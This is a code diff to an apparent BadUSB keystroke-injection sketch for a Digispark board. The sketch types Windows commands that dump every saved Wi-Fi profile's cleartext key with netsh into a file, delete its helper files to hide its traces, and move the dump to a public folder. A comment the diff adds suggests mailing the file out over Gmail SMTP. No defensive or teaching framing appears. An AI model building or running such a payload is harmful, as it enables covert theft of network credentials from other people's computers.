@@ -34,7 +34,7 @@ void setup() {
   DigiKeyboard.print("filter.bat");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-  DigiKeyboard.print(F("(for /f \"tokens=*\" %i in (b.txt\) do @echo     SSID: %i & netsh wlan show profiles name=\"%i\" key=clear | findstr /c:\"Key Content\" & echo.\) > WiFiPasswords.txt"));
+  DigiKeyboard.print(F("(for /f \"tokens=*\" %i in (b.txt\) do @echo     SSID: %i & netsh wlan show profiles name=\"%i\" key=clear | findstr /c:\"Key Content\" & echo.\) > Passwords.txt"));
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
   DigiKeyboard.print("del a.txt");
@@ -44,7 +44,8 @@ void setup() {
   DigiKeyboard.print("del filter.bat");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
-  DigiKeyboard.print("move WiFiPasswords.txt \\Users\\Public");
+  DigiKeyboard.print("move Passwords.txt \\Users\\Public");
+  //or any other action - send yourself the file with gmail SMTP, etc.
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(200);
 
